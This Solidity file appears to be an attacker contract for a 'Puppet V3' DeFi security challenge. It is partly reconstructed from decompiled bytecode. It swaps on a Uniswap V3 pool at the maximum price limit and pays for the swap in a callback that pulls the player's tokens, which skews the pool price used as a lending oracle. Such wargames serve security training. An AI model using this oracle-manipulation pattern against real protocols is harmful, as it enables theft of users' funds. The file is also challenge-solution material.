// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

import "@uniswap/v3-core/contracts/interfaces/IERC20Minimal.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
//import "@uniswap/v3-core/contracts/libraries/TransferHelper.sol";
//import "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
import "./PuppetV3Pool.sol";


contract AttackerPuppetV3 {
    IERC20Minimal token; // STORAGE[0x1] bytes 0 to 19
    IUniswapV3Pool uniswapV3Pool; // STORAGE[0x2] bytes 0 to 19
    uint160 constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970341;

    constructor(IERC20Minimal _token, IUniswapV3Pool _uniswapV3Pool) {
        token = _token;
        uniswapV3Pool = _uniswapV3Pool;
    }

    // function () public payable { 
    //     revert();
    // }

    function swap(address _player, int256 _DVTAmount) public { 
        // require(msg.data.length - 4 >= 64);
        // v0 = new array[](32);
        // v1 = v2 = 0;
        // while (v1 < 32) {
        //     v0[v1] = MEM[32 + MEM[64] + v1];
        //     v1 = v1 + 32;
        // }
        // v3 = v4 = 32 + v0.data;
        // if (0) {
        //     MEM[v4 - 0] = ~0x0 & MEM[v4 - 0];
        // }
        // require(stor_2_0_19.code.size);
        bytes memory playerAddress = abi.encode(_player);
        uniswapV3Pool.swap(_player, false, _DVTAmount, MAX_SQRT_RATIO, playerAddress);
        // require(v5); // checks call status, propagates error data on error
        // require(RETURNDATASIZE() >= 64);
    }

function uniswapV3SwapCallback(int256 _amount0, int256 _amount1, bytes memory _data) public { 
    // require(msg.data.length - 4 >= 96);
    // require(varg2 <= 0x100000000);
    // require(varg2.data <= 4 + (msg.data.length - 4));
    // require(!((varg2.length > 0x100000000) | (varg2.data + varg2.length > 4 + (msg.data.length - 4))));
    // require(varg2.length >= 32);
    // require(_uniswapV3SwapCallback.code.size);
    address player = abi.decode(_data, (address));
    token.transferFrom(player, msg.sender, uint(_amount1));
    // require(v0); // checks call status, propagates error data on error
    // require(RETURNDATASIZE() >= 32);
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

// function __function_selector__(bytes4 function_selector) public payable { 
//     MEM[64] = 128;
//     require(!msg.value);
//     if (msg.data.length >= 4) {
//         if (0xced6dc24 == function_selector >> 224) {
//             0xced6dc24();
//         } else if (0xfa461e33 == function_selector >> 224) {
//             uniswapV3SwapCallback(int256,int256,bytes);
//         }
//     }
//     ();
// }
}